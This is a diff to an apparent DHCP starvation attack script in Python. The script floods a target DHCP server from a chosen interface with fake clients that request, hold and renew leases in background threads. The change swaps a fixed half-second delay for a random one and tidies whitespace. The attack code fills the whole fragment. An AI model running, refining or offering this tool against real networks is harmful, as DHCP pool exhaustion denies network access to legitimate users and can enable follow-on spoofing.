@@ -2,7 +2,7 @@ from  dhcpClient import DHCPClient,DHCPStatus
 from  threading import Thread 
 import time 
 import sys
-
+import random 
 
 def starvation(presist : bool  ,  iface : str  , target: str )-> None : 
 	'''
@@ -14,13 +14,12 @@ def starvation(presist : bool  ,  iface : str  , target: str )-> None :
 			-i IFACE, --iface IFACE Interface you wish to use
               		-t TARGET, --target TARGET IP of target server
 	'''
- 
 
 	clients = [] 
 
 	def push(clients):
 		while(1):
-			time.sleep(0.5)
+			time.sleep(random.random())
 			clt = DHCPClient()
 			clt.mantian = True
 			clt.discover().join()
@@ -38,15 +37,10 @@ def starvation(presist : bool  ,  iface : str  , target: str )-> None :
 					client.to_trash().join()
 					time.sleep(0.1)
 					print(f"""{client.stat} -{client.name} reconnect""")
-			
-
-
-	
+				
 	presistT = Thread (target = mantain ,args = (clients,)) if presist else  None
 	push = Thread (target = push  ,args = (clients,)) if presist else  None
  
- 
-
 	def starv(clients):
 		threads =[ ]
 		DHCPClient.reset()
